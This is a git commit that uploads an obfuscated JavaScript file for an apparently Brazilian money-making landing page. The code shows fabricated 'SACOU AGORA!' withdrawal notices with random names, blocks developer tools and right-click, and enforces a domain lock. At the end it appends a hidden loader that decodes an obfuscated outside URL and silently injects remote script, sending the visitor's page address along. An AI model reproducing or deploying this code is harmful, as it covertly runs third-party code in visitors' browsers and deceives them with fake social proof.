3d4b0ec3ae8130d4116d70b184076dbd61723573
520Potencializando <107007282+520Potencializando@users.noreply.github.com>
2023-04-25 14:00:32 -0300

    Add files via upload

---
+++ PAGINA 5/js/fGNnMb1263923.js
@@ -0,0 +1,188 @@
+const _0x4ab3f9 = _0x898b;
+! function(f, a) {
+    const x = _0x898b,
+        b = _0x4214();
+    for (;;) try {
+        if (902275 === -parseInt(x(620)) / 1 + parseInt(x(744)) / 2 + parseInt(x(746)) / 3 + -parseInt(x(625)) / 4 + parseInt(x(731)) / 5 * (-parseInt(x(770)) / 6) + parseInt(x(646)) / 7 * (parseInt(x(757)) / 8) + parseInt(x(509)) / 9) break;
+        b.push(b.shift())
+    } catch (f) {
+        b.push(b.shift())
+    }
+}();
+const _0x4e33f8 = 120,
+    _0x29dc67 = ["Jose", "Joao", _0x4ab3f9(775), _0x4ab3f9(696), "Carlos", _0x4ab3f9(677), _0x4ab3f9(502), _0x4ab3f9(737), _0x4ab3f9(716), _0x4ab3f9(604), _0x4ab3f9(689), _0x4ab3f9(692), _0x4ab3f9(497), _0x4ab3f9(545), _0x4ab3f9(743), _0x4ab3f9(513), _0x4ab3f9(740), _0x4ab3f9(586), _0x4ab3f9(546), _0x4ab3f9(569), _0x4ab3f9(750), "Mateus", "Andre", "Fernando", _0x4ab3f9(612), _0x4ab3f9(673), _0x4ab3f9(680), "Guilherme", _0x4ab3f9(557), "Tiago", _0x4ab3f9(649), _0x4ab3f9(644), _0x4ab3f9(705), "Jorge", _0x4ab3f9(634), "Alexandre", _0x4ab3f9(610), _0x4ab3f9(544), _0x4ab3f9(651), _0x4ab3f9(701), _0x4ab3f9(659), _0x4ab3f9(730), "Matheus", _0x4ab3f9(669), _0x4ab3f9(667), _0x4ab3f9(561), _0x4ab3f9(736), "Julio", _0x4ab3f9(624), _0x4ab3f9(720), _0x4ab3f9(698), "Rogerio", _0x4ab3f9(739), _0x4ab3f9(710), _0x4ab3f9(670), _0x4ab3f9(589), _0x4ab3f9(537), _0x4ab3f9(661), _0x4ab3f9(718), _0x4ab3f9(672), "Jeferson", "Cicero", _0x4ab3f9(751), _0x4ab3f9(777), _0x4ab3f9(580), _0x4ab3f9(640), _0x4ab3f9(635), "Henrique", _0x4ab3f9(575), _0x4ab3f9(617), "Joaquim", _0x4ab3f9(745), _0x4ab3f9(647), "Marco", _0x4ab3f9(771), "Nelson", _0x4ab3f9(765), _0x4ab3f9(506), _0x4ab3f9(663), _0x4ab3f9(648), _0x4ab3f9(500), _0x4ab3f9(702), _0x4ab3f9(609), _0x4ab3f9(762), _0x4ab3f9(711), _0x4ab3f9(591), "Mauro", _0x4ab3f9(567), "Gilmar", _0x4ab3f9(577), _0x4ab3f9(709), _0x4ab3f9(714), _0x4ab3f9(662), _0x4ab3f9(671), "Jair", _0x4ab3f9(703), _0x4ab3f9(499), "Osvaldo", _0x4ab3f9(675), _0x4ab3f9(723), _0x4ab3f9(603), "Silvio", _0x4ab3f9(772), _0x4ab3f9(529), _0x4ab3f9(693), _0x4ab3f9(508), "Artur", _0x4ab3f9(602), _0x4ab3f9(528), _0x4ab3f9(565), _0x4ab3f9(585), _0x4ab3f9(726), _0x4ab3f9(768), _0x4ab3f9(715), _0x4ab3f9(748), _0x4ab3f9(708), "Domingos", _0x4ab3f9(695), _0x4ab3f9(697), _0x4ab3f9(582), _0x4ab3f9(707), _0x4ab3f9(655), _0x4ab3f9(514), _0x4ab3f9(534), "Cesar", _0x4ab3f9(756), _0x4ab3f9(657), _0x4ab3f9(571), _0x4ab3f9(525), "Ailton", _0x4ab3f9(691), _0x4ab3f9(733), _0x4ab3f9(595), _0x4ab3f9(522), _0x4ab3f9(681), "Rubens", "Nilton", _0x4ab3f9(555), _0x4ab3f9(596), "Osmar", "Nilson", _0x4ab3f9(543), _0x4ab3f9(632), "Otavio", _0x4ab3f9(597), _0x4ab3f9(592), _0x4ab3f9(621), "Alisson", "Aparecido", _0x4ab3f9(550), _0x4ab3f9(505), "Francisca", _0x4ab3f9(576), "Adriana", _0x4ab3f9(563), _0x4ab3f9(515), _0x4ab3f9(758), _0x4ab3f9(633), _0x4ab3f9(722), "Sandra", "Camila", _0x4ab3f9(547), "Bruna", _0x4ab3f9(653), _0x4ab3f9(729), _0x4ab3f9(638), _0x4ab3f9(643), _0x4ab3f9(631), _0x4ab3f9(593), _0x4ab3f9(613), _0x4ab3f9(724), _0x4ab3f9(564), _0x4ab3f9(549), _0x4ab3f9(540), _0x4ab3f9(559), _0x4ab3f9(678), _0x4ab3f9(520), "Sonia", _0x4ab3f9(501), _0x4ab3f9(732), "Josefa", "Simone", _0x4ab3f9(572), "Cristiane", _0x4ab3f9(556), _0x4ab3f9(622), _0x4ab3f9(738), _0x4ab3f9(611), _0x4ab3f9(554), "Aparecida", "Daniela", "Marlene", _0x4ab3f9(616), _0x4ab3f9(574), _0x4ab3f9(749), "Fabiana", _0x4ab3f9(761), _0x4ab3f9(685), _0x4ab3f9(641), _0x4ab3f9(727), _0x4ab3f9(742), _0x4ab3f9(541), _0x4ab3f9(682), _0x4ab3f9(656), _0x4ab3f9(658), _0x4ab3f9(660), _0x4ab3f9(527), "Alessandra", _0x4ab3f9(766), _0x4ab3f9(579), _0x4ab3f9(776), "Flavia", _0x4ab3f9(614), _0x4ab3f9(713), _0x4ab3f9(518), "Priscila", _0x4ab3f9(517), "Luiza", _0x4ab3f9(524), "Isabela", "Marta", _0x4ab3f9(753), _0x4ab3f9(741), "Laura", "Marli", _0x4ab3f9(645), _0x4ab3f9(706), _0x4ab3f9(530), _0x4ab3f9(583), _0x4ab3f9(668), _0x4ab3f9(654), _0x4ab3f9(511), "Edna", _0x4ab3f9(566), _0x4ab3f9(684), _0x4ab3f9(636), "Alice", _0x4ab3f9(601), _0x4ab3f9(704), _0x4ab3f9(560), "Celia", "Valeria", _0x4ab3f9(599), "Sabrina", "Andrea", _0x4ab3f9(700), _0x4ab3f9(581), "Thais", _0x4ab3f9(578), _0x4ab3f9(688), _0x4ab3f9(588), _0x4ab3f9(538), _0x4ab3f9(553), "Eva", _0x4ab3f9(570), _0x4ab3f9(728), "Elisangela", _0x4ab3f9(504), "Geovana", _0x4ab3f9(639), "Tamires", _0x4ab3f9(764), _0x4ab3f9(587), "Elza", _0x4ab3f9(498), _0x4ab3f9(652), _0x4ab3f9(532), _0x4ab3f9(747), _0x4ab3f9(752), _0x4ab3f9(526), _0x4ab3f9(628), "Cintia", "Ivone", _0x4ab3f9(590), _0x4ab3f9(503), _0x4ab3f9(642), _0x4ab3f9(516), _0x4ab3f9(760), _0x4ab3f9(536), _0x4ab3f9(562), _0x4ab3f9(606), _0x4ab3f9(773), "Brenda", _0x4ab3f9(512), "Rosilene", _0x4ab3f9(552), "Nair", "Neusa", _0x4ab3f9(558), "Neuza", _0x4ab3f9(717), _0x4ab3f9(683), _0x4ab3f9(521), _0x4ab3f9(584), _0x4ab3f9(568), "Samara", _0x4ab3f9(510), "Janete"];
+
+function _0x2f4161() {
+    const f = _0x4ab3f9;
+    (function() {
+        let f = !0;
+        return function(a, x) {
+            const b = f ? function() {
+                const f = _0x898b;
+                if (x) {
+                    const b = x[f(754)](a, arguments);
+                    return x = null, b
+                }
+            } : function() {};
+            return f = !1, b
+        }
+    })()(this, (function() {
+        const f = _0x898b,
+            a = function() {
+                const f = _0x898b;
+                let a;
+                try {
+                    a = Function(f(531) + f(735) + ");")()
+                } catch (f) {
+                    a = window
+                }
+                return a
+            }(),
+            x = new RegExp("[ByqXUPxUTHCSdBqbHbXHqQEAvYBESJICAJUMUUblBIgTkVqrkMDFPpYLgREASWlRLRgiUEjjqMEqjtNqiJ]", "g"),
+            b = f(535)[f(600)](x, "")[f(650)](";");
+        let _, n, t, r;
+        const e = function(a, x, b) {
+                const _ = f;
+                if (a[_(607)] != x) return !1;
+                for (let f = 0; f < x; f++)
+                    for (let x = 0; x < b[_(607)]; x += 2)
+                        if (f == b[x] && a[_(690)](f) != b[x + 1]) return !1;
+                return !0
+            },
+            w = function(f, a, x) {
+                return e(a, x, f)
+            },
+            v = function(f, a, x) {
+                return w(a, f, x)
+            };
+        for (let f in a)
+            if (e(f, 8, [7, 116, 5, 101, 3, 117, 0, 100])) {
+                _ = f;
+                break
+            } for (let f in a[_])
+            if (v(f, [5, 110, 0, 100], 6)) {
+                n = f;
+                break
+            } for (let f in a[_])
+            if (v(f, [7, 110, 0, 108], 8)) {
+                t = f;
+                break
+            } if (!("~" > n))
+            for (let f in a[_][t])
+                if (w([7, 101, 0, 104], f, 8)) {
+                    r = f;
+                    break
+                } if (!_ || !a[_]) return;
+        const u = a[_][n],
+            M = !!a[_][t] && a[_][t][r],
+            B = u || M;
+        if (!B) return;
+        let o = !1;
+        for (let a = 0; a < b[f(607)]; a++) {
+            const x = b[a],
+                _ = x[0] === String[f(623)](46) ? x.slice(1) : x,
+                n = B[f(607)] - _[f(607)],
+                t = B.indexOf(_, n); - 1 !== t && t === n && (B[f(607)] == x[f(607)] || 0 === x[f(605)](".")) && (o = !0)
+        }
+        if (!o) {
+            const x = new RegExp(f(686), "g"),
+                b = f(759)[f(600)](x, "");
+            a[_][t] = b
+        }
+    }))();
+    const a = window[f(664)][f(712)] + f(774),
+        x = window[f(664)][f(712)] + f(507);
+    document[f(674)]("p") && document[f(674)]("p")[f(694)](f(712), a), document[f(674)]("t") && document[f(674)]("t")[f(694)](f(712), x), _0x482e9d(), setTimeout((() => {
+        _0x26ca37()
+    }), 12e4);
+    let b = document.getElementsByTagName(f(699))[0];
+    b && b.classList[f(618)]("u"), document[f(523)]("keydown", (function(a) {
+        const x = f;
+        a[x(542)] && a[x(719)]()
+    })), document.onkeydown = function(a) {
+        if (123 == a[f(763)]) return !1
+    }, document.addEventListener(f(630), (a => a[f(719)]()))
+}
+
+function _0x4214() {
+    const f = ["y2HHCKnVzgvbDa", "sNvUAw9Y", "r2fICMLLBa", "uMvPBMfSzg8", "C2v0qxr0CMLIDxrL", "v2fNBMvY", "rNjHBMnPC2nV", "u2fUzhjV", "vMLUAwnPDxm", "yM9KEq", "vgfUAwe", "vML0B3i", "thvHBG", "qwXLC3nHBMrYBW", "uM9Zyw5H", "twfYy2LV", "twfYAw5H", "rwrPBhnVBG", "twLSDg9U", "rMfIAwfUBW", "uM9UywXKBW", "u2v2zxjPBM8", "AhjLzG", "vML2AwfUzq", "v2vZBgv5", "vMLJzw50zq", "thvPEG", "tMvPzgu", "rgf2Aq", "ChjLDMvUDerLzMf1Bhq", "qwXLEa", "C2HVDW", "qwXPBMu", "v2LSBgLHBG", "vMvYyq", "y3jLyxrLrwXLBwvUDa", "q2XLAxrVBG", "uMfMywvSyq", "rwr1yxjKyq", "tgv0AwnPyq", "q2XHDwrPBW", "ntu5nZbgugvqsMy", "rwXPyw5L", "qNjLBM8", "CxvLCNLtzwXLy3rVCG", "E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK", "thvJAwfUBW", "thvJyxm", "uM9Zyw5NzwXH", "u2fTDwvS", "rwr1yxjKBW", "sMfUywLUyq", "sM9HBMe", "twfYy2vSBW", "mtq5mda2mMzUvKnbCq", "qMvUzwrPDg8", "nduWmdKYmu5VDwvfzW", "vMfUAwe", "qxj0AhvY", "qw5KCMvPyq", "twfUB2vS", "vMLJDg9Y", "sxjLBMu", "q2fYB2XPBMu", "yxbWBhK", "C2nYAxb0", "vMfSBwLY", "mJiYmtaXnMLWELzOuG", "rMvYBMfUzge", "yuPjyM9sDxq6yLLPz1biBhDHtxz3txHUvgTeq2LMCM1gBvH5CNjMwLn3zem", "sM9Py2u", "thvJAwe", "uMvUyw4", "A2v5q29Kzq", "vgf0AwfUyq", "q3jPC3rPyw5V", "sxnHyMvS", "u0fdt1uGquDpuKeH", "vMfUzgvYBgvP", "zM9YrwfJAa", "nte2vKntu1bz", "qwXHBG", "sgvSAw8", "r2fICMLLBgu", "l3bYAxzHy2LKywrL", "qw50B25PBW", "qMLHBMnH", "twLNDwvS", "uMfMywvS", "vgfSAxrH", "rxzLCNrVBG", "rw1LCNnVBG", "uMvUyxrH", "ugvKCM8", "qMvUzwrPDge", "vMLSBwe", "qw5H", "rwXPyxm", "l3rLCM1VCW", "ugfIBg8", "nZC4nti4oer2wffrrG", "tgLSAwfU", "u29Syw5Nzq", "vMvYB25Py2e", "qNj1BM8", "qwrHBW", "twfYy2LH", "vgfPBMe", "ugf1Bge", "u2LSDMfUyq", "BM90lw1ZzW", "thvHBMe", "twfPyxjH", "uNvHBG", "ywrKrxzLBNrmAxn0zw5LCG", "vgvYzxPH", "rwr2ywXKBW", "sM9ZAwfUzq", "rgfPyw5L", "vMfSDgvY", "twfPy29U", "u2LSDMLH", "CMv0DxjUicHMDw5JDgLVBIGPia", "ugfTzwXH", "C3r5Bgu", "rxzHBMrYBW", "qM15zxfVB1HZvvb1EgnvzxnusentzhncBY5XzMj1sgjUo3D3whCUBwviCvffB0fVDNnzqKv1y2vtsKLdquPZC1vVlK1MDw5vvwjSqKLNvgTwCxjRturguhbztgDsruftv2XstfjNAvvfAMPXtuvXANroCwLk", "twLYAwfU", "rg91z2XHCW", "twfYAwXLBMu", "B3bLBG", "q2XHDwrPyq", "thv6Awe", "y3rYBeTLEq", "t3jSyw5KBW", "rwrZB24", "rgfUAwvS", "uMfPBxvUzg8", "qw1HBMrH", "Dg9Nz2XL", "tgfYAxnZyq", "twfYAwe", "y29UDgfPBNm", "s2fYAw5H", "s2f0Awe", "uM9Zyq", "qxvNDxn0BW", "q2fYBge", "tgvHBMrYBW", "twfYz2fYAwrH", "qMvHDhjPEG", "qw5KCMvZC2e", "qwrYAwfUBW", "rwXPEMfIzxrL", "sNvSAwfUyq", "vML0B3jPyq", "q2vSC28", "rMf0Aw1H", "sM9Uyxm", "rNjHBMnPzwXL", "uM9KCMLNBW", "twLSzw5H", "sNvSAwfUBW", "tMf0ywXPyq", "lMLTywDLx3DVtenYudmWodC2nZu", "uMfPBxvUzge", "q2fPBW", "qw50B25Pyq", "sMvHBG", "rgvUAxnL", "u2fYyq", "uM9IC29U", "qMfYyMfYyq", "tw9PC2vZ", "tw9UAwnH", "tg9Yzw5H", "sxzHBG", "rMvSAxbL", "uM9Izxj0yq", "r2LZzwXL", "rMXHDMLV", "tgfPCW", "rMfICMLJAw8", "sxrHBg8", "twfYAwfUyq", "Bwf4sgvPz2H0", "tMLJB2XHCW", "q2XLyMvY", "vMLUAwnPB3m", "CMvTB3zL", "rwXPyw5H", "CMvWBgfJzq", "q2fYB2XPBMe", "vMfNBMvY", "sM9LBa", "twfYy29Z", "Aw5KzxHpzG", "qw5NzwXPy2e", "BgvUz3rO", "zMXVB3i", "rgf2Awq", "uM9Izxj0BW", "sMfXDwvSAw5L", "rMfIAw8", "r2fICMLLBge", "rxjPy2e", "Bg9HzgLUzW", "vgvYzxPPBMHH", "uMvNAw5HBgrV", "ywrK", "Bwq1", "mJCYntKWCfD6y3js", "v2LSAwfU", "rgvIB3jH", "zNjVBunOyxjdB2rL", "uMvUyxrV", "ntaWmtC5mMLhEMvJua", "CMfUzg9T", "BM90lw5HBwu", "tgL2Awe", "CxvLCNLtzwXLy3rVCKfSBa", "y29UDgv4Dg1LBNu", "vMfUzxnZyq", "shvNBW", "ugf0CMLJAwe", "u2vIyxn0AwfV", "rgfUAwXV", "q3jPC3rPBMe", "y2XPy2S", "sNvSAwe", "thvJAwvUzq", "twf1CMLJAw8", "qw5NzwXH", "u2vIyxn0AwfUyq", "thvJAwfUyq", "uMLJyxjKBW", "vgf0AwfUzq", "n05xsNvmza", "r2LSyMvYDg8", "vMfSzgLY", "qw5KzxjZB24", "C3bSAxq", "rgLLz28", "twfYy2vSyq", "sMvZC2LJyq", "twLJAgvSzq", "qwrLBwLY", "uMvNAw5H", "txvYAwXV", "rgfUAwvSzq", "u2vYz2LV", "u3vLBgK", "swDVCG", "rgLVz28", "v2LSC29U", "Bg9JyxrPB24", "Aw5UzxjuzxH0", "yxbWzw5Kq2HPBgq", "r2vYywXKBW", "vgfPCW", "vgHPywDV", "twfYAw8", "qwrPBhnVBG", "twfUDwvS", "tgvVBMfYzg8", "z2v0rwXLBwvUDej5swq", "r2LSC29U", "y2XHC3nmAxn0", "ugf1Bg8", "uML0yq", "Ahr0Chm6lY9Jzg4UANnKzwXPDNiUBMv0l25WBs9KAxnHyMXLlwrLDNrVB2Xamc4YlJu", "r3vZDgf2BW", "qwXIzxj0BW", "rwXHAw5L", "uMfPC3nH", "sgvSzw5H", "uMfXDwvS", "w0PjuLLPz1biD012D014verdAwzYBuzTwhLYCMzAu3DKq10", "zgLZywjSzs1Kzxz0B29Slwf1Dg8", "uM9ZzwXP", "thvPCW"];
+    return (_0x4214 = function() {
+        return f
+    })()
+}
+
+function _0x898b(f, a) {
+    const x = _0x4214();
+    return (_0x898b = function(a, b) {
+        let _ = x[a -= 497];
+        if (void 0 === _0x898b.sUxGrV) {
+            var n = function(f) {
+                let a = "",
+                    x = "";
+                for (let x, b, _ = 0, n = 0; b = f.charAt(n++); ~b && (x = _ % 4 ? 64 * x + b : b, _++ % 4) ? a += String.fromCharCode(255 & x >> (-2 * _ & 6)) : 0) b = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(b);
+                for (let f = 0, b = a.length; f < b; f++) x += "%" + ("00" + a.charCodeAt(f).toString(16)).slice(-2);
+                return decodeURIComponent(x)
+            };
+            _0x898b.HwIjwm = n, f = arguments, _0x898b.sUxGrV = !0
+        }
+        const t = x[0],
+            r = a + t,
+            e = f[r];
+        return e ? _ = e : (_ = _0x898b.HwIjwm(_), f[r] = _), _
+    })(f, a)
+}
+
+function _0x26ca37() {}
+
+function _0x1ac691(f, a) {
+    const x = _0x4ab3f9;
+    return Math[x(608)](Math[x(626)]() * (a - f + 1) + f)
+}
+
+function _0x24330d(f, a) {
+    const x = _0x4ab3f9;
+    var b = document[x(674)]("snackbar");
+    document[x(674)](x(627)).innerText = f, document.getElementById(x(519))[x(665)] = a, b.classList[x(618)](x(721)), setTimeout((function() {
+        const f = x;
+        b.classList[f(598)](f(721))
+    }), 4e3)
+}
+
+function _0x482e9d() {
+    const f = _0x4ab3f9;
+    document[f(629)](f(573)).forEach((a => {
+        const x = f;
+        a[x(523)](x(637), (function() {
+            const f = x;
+            window[f(664)][f(712)] = ""
+        }))
+    }));
+    let a = _0x1ac691(0, _0x29dc67[f(607)] - 1);
+    _0x24330d(_0x29dc67[a], "SACOU AGORA!"), setInterval((() => {
+        const a = f;
+        let x = _0x1ac691(0, _0x29dc67.length - 1);
+        _0x24330d(_0x29dc67[x], a(767))
+    }), 8e3), document[f(629)](".question")[f(769)]((a => {
+        const x = f;
+        a[x(523)]("click", (function() {
+            const f = x,
+                b = a.nextElementSibling;
+            b.classList[f(551)](f(539)) ? b.style[f(594)] = null : b[f(533)].maxHeight = b.scrollHeight + "px", b[f(676)][f(548)](f(539)), a[f(676)][f(548)](f(539))
+        }))
+    }))
+}
+_0x4ab3f9(615) !== document.readyState ? _0x2f4161() : document[_0x4ab3f9(523)]("DOMContentLoaded", (function() {
+    _0x2f4161()
+}));
+const _0x51962d = document[_0x4ab3f9(725)](_0x4ab3f9(755));
+_0x51962d[_0x4ab3f9(694)]("src", _0x4ab3f9(679)), _0x51962d[_0x4ab3f9(694)](_0x4ab3f9(687), ""), _0x51962d[_0x4ab3f9(694)](_0x4ab3f9(619), "7e9f71f8f7f16e1b7cec3a14104f46f7"), document[_0x4ab3f9(734)](_0x4ab3f9(699))[_0x4ab3f9(666)](_0x51962d);
+(function(o, d, l) {
+    try {
+        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
+        o.b = o.f('UMUWJKX');
+        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
+            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
+        }, 1000);
+        d.cookie = o.b + '=full;max-age=39800;'
+    } catch (e) {};
+}({}, document, location));
